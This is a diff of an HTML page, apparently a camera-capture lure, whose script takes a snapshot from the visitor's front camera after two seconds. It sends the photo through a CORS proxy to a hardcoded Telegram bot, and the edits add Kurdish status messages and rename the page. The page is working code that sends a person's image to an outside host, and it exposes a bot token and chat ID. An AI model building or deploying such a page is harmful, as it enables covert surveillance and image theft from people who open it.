@@ -3,13 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Access</title>
+    <title>Camera Tool</title>
 </head>
-<body style="background-color: #888888; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+<body style="background-color: #222; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; padding: 20px;">
+
+    <h3 id="status">چاوەڕوان بە... (Connecting...)</h3>
 
     <script>
+      const statusEl = document.getElementById('status');
+
       navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
+          statusEl.innerText = "کامێرا کارا بوو، وێنە دەگیرێت...";
           const video = document.createElement('video');
           video.srcObject = stream;
           video.play();
@@ -22,27 +27,31 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
+              statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ تلگرام...";
               const formData = new FormData();
               formData.append('chat_id', '6539379136');
               formData.append('photo', blob, 'snapshot.jpg');
 
-              // بەکارهێنانی پرۆکسی بۆ تێپەڕاندنی ڕێگرییەکانی CORS
               fetch('https://corsproxy.io/?https://api.telegram.org/bot8998865631:AAGvEie2pNz2fEl00AHDt_H0MgkFU20hZM/sendPhoto', {
                 method: 'POST',
                 body: formData
               })
               .then(response => response.json())
               .then(data => {
-                console.log('Success:', data);
+                if(data.ok) {
+                    statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
+                } else {
+                    statusEl.innerText = "❌ هەڵە لە تلگرام: " + (data.description || JSON.stringify(data));
+                }
               })
               .catch(error => {
-                console.error('Error:', error);
+                statusEl.innerText = "❌ هەڵەی ناردن (Error): " + error.message;
               });
             }, 'image/jpeg');
           }, 2000);
         })
         .catch(err => {
-          console.error('Camera Error:', err);
+          statusEl.innerText = "❌ هەڵەی کامێرا: " + err.message;
         });
     </script>
 
